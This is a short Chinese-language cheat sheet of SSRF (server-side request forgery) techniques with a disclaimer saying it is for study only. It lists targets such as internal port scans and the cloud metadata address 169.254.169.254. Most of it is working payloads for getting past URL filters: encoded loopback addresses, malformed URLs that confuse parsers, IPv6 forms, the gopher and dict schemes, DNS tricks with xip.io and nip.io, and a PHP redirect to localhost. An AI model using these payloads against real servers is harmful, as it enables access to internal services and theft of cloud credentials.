# SSRF

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# 利用方式

- 内部端口扫描
- Leverage cloud services
    - 169.254.169.254
        - https://www.ibm.com/developerworks/cn/cloud/library/1620-openstack-metadata-service/index.html
- reveal IP Address & HTTP Library
    - https://webhook.site/
- Download a very large file (Layer 7 DoS)

---

# 绕过方法

**特殊 IP**
```
http://0177.1/
http://0x7f.1/
http://127.000.000.1
https://520968996
```

> The latter can be calculated using http://www.subnetmask.info/

**错误 IP**
```
http://127.1
http://0
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3
http://127.1.1.1:80\@127.2.2.2:80/
```

**IPv6**

```
http://[::1]
http://[::]
http://[::]:80/
http://0000::1:80/
```

**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**DNS 欺骗**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

> http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

> http://nip.io

**重定向欺骗**
```
<?php header(“location: http://127.0.0.1"); ?>
```

**编码绕过**

这些包括十六进制编码，八进制编码，双字编码，URL 编码和混合编码。

```
127.0.0.1 translates to 0x7f.0x0.0x0.0x1
127.0.0.1 translates to 0177.0.0.01
http://127.0.0.1 translates to http://2130706433
localhost translates to %6c%6f%63%61%6c%68%6f%73%74
```
